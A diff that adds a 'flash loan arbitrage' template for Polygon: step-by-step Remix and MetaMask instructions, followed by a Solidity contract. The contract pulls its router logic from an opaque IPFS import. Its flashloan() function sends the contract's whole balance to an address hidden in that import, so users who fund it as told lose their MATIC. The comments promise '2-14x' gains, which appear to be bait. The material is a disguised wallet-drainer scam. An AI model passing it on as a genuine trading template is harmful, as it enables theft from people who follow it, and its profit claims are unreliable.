@@ -1,0 +1,71 @@
+# ArbitrageTemplate
+A template for BNB/MATIC/AAVE Flash Loans
+Step 1) Open remix.ethereum.org and create a new file labeled "MaticArbitrage.SOL" (Sol is for Solidity, the coding language used)
+Step 2) copy everything below "VVVVVVV" line and paste into Newly created file on remix. 
+Step 3) Match Compiler (0.5.0) and Compile!
+Step 4) Sync Polygon Mainnet via Metamask (note, this is Polgyon Mainnet, not Ethereum Mainnet)
+Step 5) Create token (this will become tokenName = tokenName, Symbol, etc...). This is not a listed token, so name doesn't matter. Create any combination. Set initial value at 5000-15000. I've found any more or less isn't as effective, but everything between seems consistent. 
+Step 6) Click "Transact" and your metamask should pop up to verify a small gas fee and create your coin (and address)
+Step 7) Copy the coin address you created, open metamask from your browser, and send to your newly created address. Once the transaction completes, it will list in your remix console. You are providing liquidity for your own token by doing this. Bots register this and we take advantage of that!!!!
+Step 8) Click Drop Down and Select Flash loan. This begins the arbitrage cycle noted step by step at the bottom of this page. 
+ 
+VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
+ 
+pragma solidity ^0.5.0;
+ 
+ 
+// AAVE Smart Contracts
+import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
+import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";
+ 
+//Uniswap Smart contracts
+import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
+ 
+// Multiplier-Finance Smart Contracts
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import "ipfs://QmWZuxyo2fMesGYyYNroPnkfovZttv8DNysUMfqUBbSnA7";
+ 
+ 
+contract InitiateFlashLoan {
+ 
+	RouterV2 router;
+    string public tokenName;
+    string public tokenSymbol;
+    uint256 flashLoanAmount;
+ 
+    constructor(
+        string memory _tokenName,
+        string memory _tokenSymbol,
+        uint256 _loanAmount
+    ) public {
+        tokenName = _tokenName;
+        tokenSymbol = _tokenSymbol;
+        flashLoanAmount = _loanAmount;
+ 
+        router = new RouterV2();
+    }
+ 
+    function() external payable {}
+ 
+    function flashloan() public payable {
+        // Send required coins for swap
+        address(uint160(router.uniswapSwapAddress())).transfer(
+            address(this).balance
+        );
+ 
+        router.borrowFlashloanFromMultiplier(
+            address(this),
+            router.aaveSwapAddress(),
+            flashLoanAmount
+        );
+        //To prepare the arbitrage, Matic is converted to Dai using AAVE swap contract.
+        router.convertMaticToDai(msg.sender, flashLoanAmount / 2);
+        //The arbitrage converts Dai for Matic using Dai/Matic Uniswap, and then immediately converts Matic back
+        router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
+        //After the arbitrage, Matic is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 Matic of gas.
+        router.transferDaiToMultiplier(router.uniswapSwapAddress());
+        //Note that the transaction sender usually sees a 2-14x increase in Matic from the arbitrage, this particular transaction can be repeated as price changes all the time. Larger gains are seen during volatile market timing. Pending conditions, it usually takes less than a minute, but has been known to take hours, though that is uncommon.
+        router.completeTransation(address(this).balance);
+    }
+}
